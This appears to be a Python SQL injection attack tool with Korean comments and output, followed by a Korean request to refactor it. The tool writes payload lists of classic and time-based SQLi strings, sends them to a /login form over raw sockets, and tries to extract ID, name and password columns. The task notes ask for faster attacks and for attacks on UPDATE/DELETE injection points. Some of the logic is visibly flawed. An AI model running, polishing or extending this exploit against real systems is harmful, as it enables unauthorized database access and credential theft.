import os
import socket
from datetime import datetime
import re
from gevent.pool import Pool

# 필요한 디렉토리와 파일 생성 함수
def setup_required_files():
    headers_dir = "fuzz-data/headers"
    payloads_dir = "fuzz-data/payloads"

    os.makedirs(headers_dir, exist_ok=True)
    os.makedirs(payloads_dir, exist_ok=True)

    with open(os.path.join(headers_dir, "default_headers.txt"), "w") as f:
        f.write("User-Agent\nReferer\nX-Forwarded-For\n")

    with open(os.path.join(payloads_dir, "oracle_time.txt"), "w") as f:
        f.write("' OR 1=1--\n' OR 'a'='a\n' UNION SELECT NULL, NULL--\n' OR SLEEP(5)--\n")
        f.write("' OR WAITFOR DELAY '0:0:5'--\n' OR pg_sleep(5); --\n' OR dbms_lock.sleep(5); --\n")

# 파일 생성 함수 호출
setup_required_files()

class SqlEngine:
    def __init__(self, target, target_param, sqli_template):
        self.server = target['server']
        self.port = target['port']
        self.vuln_header = target.get('vulnHeader', '')
        self.header_value = target.get('headerValue', '')
        self.sleep_time = target_param.get('sleepTime', 2)
        self.sql_injection_template = sqli_template
        self.verbose = target_param.get('verbosity', 'low').lower()

        sanitized_server = re.sub(r'[^A-Za-z0-9_.-]', '_', self.server)
        self.logfile = f"logs/{sanitized_server}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        self.result = False
        self.successful_payload = ""

    def log(self, message, func_name="알 수 없는 함수"):
        """오류 로그를 파일에 기록하고, 필요시 터미널에 출력"""
        if self.verbose == "high":
            print(f"[!] {func_name}에서 오류 발생: {message}")
        os.makedirs("logs", exist_ok=True)
        with open(self.logfile, 'a') as log:
            log.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{func_name},{message}\n")

    def send_payload(self, sql, method="POST", url_path="/login"):
        """SQL 인젝션 페이로드 전송 함수"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.server, self.port))

            post_data = f"username={sql}&password=dummy_password"
            headers = (
                f"{method} {url_path} HTTP/1.1\r\n"
                f"Host: {self.server}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(post_data)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            request = headers + post_data
            s.send(request.encode())
            response = s.recv(4096).decode()
            s.close()

            sql_data = self.extract_sql_data(response)
            self.log(f"SQL 응답 데이터: {sql_data}", "send_payload")
            return sql_data
        except Exception as e:
            self.log(str(e), "send_payload")
            return None

    def extract_column_data(self):
        """테이블 지정 없이 컬럼 이름 기준으로 데이터 추출"""
        print("[*] 컬럼 기준으로 데이터 추출을 시작합니다.")
        columns = ["ID", "name", "password", "board"]
        for column in columns:
            extraction_sql = f"' UNION SELECT {column} FROM information_schema.tables--"
            response = self.send_payload(extraction_sql)
            if response:
                print(f"[*] '{column}' 컬럼의 데이터: {response}")
                self.log(f"{column}: {response}", "data_extraction")

class DBMSSQLInjectionOracle:
    def __init__(self, target, target_param, sqli_template):
        self.sql_engine = SqlEngine(target, target_param, sqli_template)

    def run(self, headers_file, injection_file):
        try:
            print("[*] Oracle SQL 인젝션을 시작합니다...")
            blind_seeker = BlindSeeker(self.sql_engine)
            blind_seeker.fuzz(headers_file, injection_file)
            if self.sql_engine.result:
                print("[*] SQL 인젝션 성공. 컬럼 데이터 추출을 시작합니다...")
                self.sql_engine.extract_column_data()
            else:
                print("[*] SQL 인젝션이 실패했습니다. 다른 페이로드를 시도하세요.")
        except Exception as e:
            print(f"[!] SQL 인젝션 중 오류 발생: {e}")

class BlindSeeker:
    def __init__(self, sql_engine):
        self.sql_engine = sql_engine
        self.pool = Pool(10)

    def fuzz(self, headers_file, injections_file):
        print(f"[*] {self.sql_engine.server}:{self.sql_engine.port}에서 퍼징을 시작합니다.")
        with open(headers_file) as headers, open(injections_file) as injections:
            for header in headers:
                header = header.strip()
                for injection in injections:
                    injection = injection.strip()
                    self.pool.spawn(self.test_payload, injection)
                    self.sql_engine.vuln_header = header
                    self.sql_engine.header_value = injection
        self.pool.join()
        self.log_results()

    def test_payload(self, sql):
        """페이로드가 유효한지 확인하고 결과 설정"""
        if self.sql_engine.send_payload(sql):
            self.sql_engine.result = True

    def log_results(self):
        if self.sql_engine.result:
            print("[*] SQL 인젝션 취약점이 발견되었습니다.")
        else:
            print("[*] 취약점이 발견되지 않았습니다. 페이로드를 조정하고 다시 시도하세요.")

# 대상 서버 설정
target = {
    'server': 'localhost',
    'port': 8080,
    'vulnHeader': 'X-Forwarded-For',
    'headerValue': 'fuzzer'
}

target_param = {
    'sleepTime': 5,
    'verbosity': 'high'
}

sqli_template = "' or if((*sql*),dbms_pipe.receive_message('a',*time*),0) and '1'='1"
header_file = "fuzz-data/headers/default_headers.txt"
injection_file = "fuzz-data/payloads/oracle_time.txt"

# DBMSSQLInjectionOracle 객체 생성 및 실행
dbms_injector = DBMSSQLInjectionOracle(target, target_param, sqli_template)
dbms_injector.run(header_file, injection_file)

 DBMS 데이터 추출을 위한 자동화 스크립트(python 기반) 제작 및 공격 진행
- 공격 속도 최적화를 위한 알고리즘 개선 및 PoC 과정 기술
- SQLi 발생 구간이 SELECT 절이 아닌, UPDATE/DELETE 구간일 때, 다른 데이터에 영향을 주지 않으면서 공격을 수행할 수 있는 방안 기술


피드백 바탕으로 전체 코드 수정하고 리팩터링해줘 출력하는 부분은 한국어로 만들어줘